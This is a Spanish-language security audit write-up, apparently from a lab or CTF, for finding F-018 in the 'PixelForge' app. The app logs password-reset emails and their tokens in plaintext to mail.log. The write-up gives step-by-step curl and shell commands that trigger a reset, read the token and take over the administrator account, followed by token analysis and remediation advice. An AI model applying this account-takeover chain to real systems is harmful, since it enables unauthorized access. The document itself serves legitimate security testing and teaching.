# 📧 F-018 — Toma de cuenta del administrador por tokens de reseteo filtrados en mail.log

![Severidad](https://img.shields.io/badge/severidad-cr%C3%ADtico-critical) ![CVSS](https://img.shields.io/badge/CVSS-8.6-red) ![CWE](https://img.shields.io/badge/CWE-532-blue) ![App](https://img.shields.io/badge/app-PixelForge-purple)

> [!IMPORTANT]
> Sin SMTP real configurado, cada email "enviado" por la app —incluidos los de reseteo de contraseña, con su token— se escribe en texto plano en un fichero de log legible desde el servidor. Segunda ruta independiente de toma de cuenta administradora, confirmada de principio a fin. 🏆 Hallazgo estrella.

## 📖 Contexto

PixelForge no tiene un servidor SMTP real configurado. En su lugar, `inc/config.php` define una función que escribe cada email a un fichero:

```php
define('MAIL_LOG', '/var/www/gamestore-storage/mail.log');

function pf_send_mail(string $to, string $subject, string $body): void {
    @mkdir(dirname(MAIL_LOG), 0777, true);
    $entry = "==================== OUTGOING MAIL ====================\n"
           . 'Date:    ' . date('r')  . "\n"
           . 'To:      ' . $to        . "\n"
           . ...
           . $body . "\n\n";
    @file_put_contents(MAIL_LOG, $entry, FILE_APPEND | LOCK_EX);
}
```

Cualquier email que la app "envía" se escribe en texto plano, en claro, en ese fichero — que se acumula indefinidamente sin rotación. Con el acceso de [F-016 — Escalada de privilegios local](F-016-escalada-privilegios-sudo-php.md), ese fichero es legible.

## 🔬 Explotación paso a paso — toma de cuenta completa, de principio a fin

**1. Disparar un reseteo de contraseña para `administrator`** (no requiere ninguna verificación, solo el username):

```bash
curl -s -X POST http://172.17.0.2:10000/forgot-password.php --data-urlencode "username=administrator"
```

**2. Leer el token desde la shell de `pepe`:**

```bash
tail -20 /var/www/gamestore-storage/mail.log
```

```
==================== OUTGOING MAIL ====================
Date:    Fri, 30 Oct 2026 16:03:38 +0000
To:      administrator <admin@pixelforge.gg>
Subject: Reset your PixelForge password
---------------------------------------------------------
    http://172.17.0.2:10000/reset-password.php?token=8b7c7cb0365002186a4f83bd4d07168a
```

**3. Usar el token directamente en el navegador** (`reset-password.php?token=...`) y fijar una contraseña nueva — confirmado: cambiada a `administrator`/`administrator`.

**4. Confirmar login con la contraseña nueva:**

```bash
curl -s -i -X POST http://172.17.0.2:10000/login.php -d "username=administrator&password=administrator"
# → 302 Found, Location: /dashboard.php
```

### 🧐 Análisis de predictibilidad del token (descartado)

Se recopilaron 4 tokens reales a lo largo de la sesión y se analizaron: longitud y charset consistentes con 128 bits aleatorios (`bin2hex(random_bytes(16))` o equivalente); se probaron hipótesis de `md5(timestamp)` / `md5(username+timestamp)` sin ningún resultado positivo; dos tokens generados con solo 10 segundos de diferencia no comparten ningún patrón (2/32 caracteres coincidentes en la misma posición — justo lo esperable por puro azar). **El algoritmo de generación del token no parece débil.** La vulnerabilidad no está en el token en sí, sino en que nunca debería haber sido legible desde el sistema de ficheros del servidor.

## 💥 Impacto

> [!CAUTION]
> Toma de cuenta administradora **de principio a fin, confirmada en vivo**: desde cero acceso hasta contraseña de administrador cambiada por el auditor, sin depender de la inyección SQL de [F-012](F-012-sqli-login-bypass-auth.md) — una ruta de ataque completamente independiente. Combinado con el resto de la cadena ([F-013](F-013-subida-fichero-rce.md) → [F-016](F-016-escalada-privilegios-sudo-php.md) → este hallazgo), demuestra que un atacante sin ninguna credencial legítima puede terminar controlando la cuenta administradora real por al menos dos caminos independientes y no relacionados entre sí.

## 🛡️ Remediación

- No registrar nunca el cuerpo completo de correos que contengan tokens/secretos — si hace falta un sumidero de correo local para desarrollo, redactar los valores sensibles antes de escribirlos a disco, o usar un servicio de correo de pruebas (Mailhog/Mailtrap) con acceso restringido.
- En producción, usar un proveedor de email transaccional real (la propia app ya referencia `MAILGUN_API_KEY` en `config.php` — parece la integración pensada originalmente).
- Revisar los permisos del directorio `gamestore-storage/`: no debería ser legible por la cuenta que ejecuta el servidor web si no es estrictamente necesario.

## 🔗 Hallazgos relacionados

- [F-016 — Escalada de privilegios local](F-016-escalada-privilegios-sudo-php.md): el acceso como `pepe` que permitió leer `mail.log`.
- [F-017 — Secretos y credenciales en texto plano](F-017-secretos-credenciales-config-php.md): confirma a nivel de base de datos que este cambio de contraseña quedó persistido.
- [F-012 — Inyección SQL en login.php](F-012-sqli-login-bypass-auth.md): la otra ruta, completamente independiente, de toma de cuenta administradora.

---
⬅ [Volver al índice de writeups](README.md) · [README principal](../README.md) · [Informe técnico (PDF)](../docs/informe-BigShop.pdf)
